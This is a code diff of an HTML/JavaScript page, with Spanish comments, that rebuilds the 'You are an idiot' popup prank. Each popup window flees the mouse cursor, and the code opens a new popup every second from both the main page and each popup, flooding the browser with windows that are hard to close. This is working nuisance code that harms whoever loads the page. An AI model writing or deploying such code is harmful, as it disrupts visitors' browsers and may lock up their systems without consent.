@@ -59,26 +59,24 @@
                 document.addEventListener('mousemove', (event) => {
                   const windowX = window.screenX;
                   const windowY = window.screenY;
-                  const distance = 150;
+                  const distance = 150; // Distancia para que la ventana "huya"
 
                   if (Math.abs(event.screenX - windowX) < distance && Math.abs(event.screenY - windowY) < distance) {
+                    // Mover la ventana a una posición aleatoria en la pantalla
                     const newX = Math.floor(Math.random() * (window.screen.availWidth - window.outerWidth));
                     const newY = Math.floor(Math.random() * (window.screen.availHeight - window.outerHeight));
                     window.moveTo(newX, newY);
                   }
                 });
 
-                // Función recursiva para abrir nuevas ventanas desde cada ventana emergente
-                function abrirVentanasRecursivamente() {
-                  setInterval(() => {
-                    const win = window.open('', '_blank', 'width=400,height=300');
-                    if (win) {
-                      win.document.write('<p style="color: yellow; font-size: 20px; background: black; text-align: center;">You are an idiot!</p>');
-                      win.blur();
-                    }
-                  }, 1000);
-                }
-                abrirVentanasRecursivamente();
+                // Intentar abrir más ventanas desde dentro de la ventana
+                setInterval(() => {
+                  const win = window.open('', '_blank', 'width=400,height=300');
+                  if (win) {
+                    win.document.write('<p style="color: yellow; font-size: 20px; background: black; text-align: center;">You are an idiot!</p>');
+                    win.blur();
+                  }
+                }, 1000);
               <\/script>
             </body>
           </html>
@@ -88,7 +86,7 @@
     }
 
     // Comienza el ciclo de ventanas en la página principal
-    abrirNuevaVentana();
+    setInterval(abrirNuevaVentana, 1000);
   </script>
 </body>
 </html>
